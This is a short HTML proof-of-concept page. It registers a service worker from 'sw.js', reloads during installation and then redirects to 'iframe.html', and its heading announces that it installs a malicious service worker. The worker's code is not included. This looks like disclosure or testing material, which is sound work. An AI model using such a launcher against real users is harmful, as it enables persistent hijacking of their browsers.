<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<title>PoC</title>
		<script>
			if ("serviceWorker" in navigator) {
				addEventListener("load", async () => {
					const registration = await navigator.serviceWorker.register("sw.js");
					if (registration.installing) {
						location.reload();
					} else {
						location = "iframe.html";
					}
				});
			}
		</script>
	</head>
	<body>
		<br>
		<center>
			<h1>This page will install a malicious service worker.</h1>
		</center>
	</body>
</html>
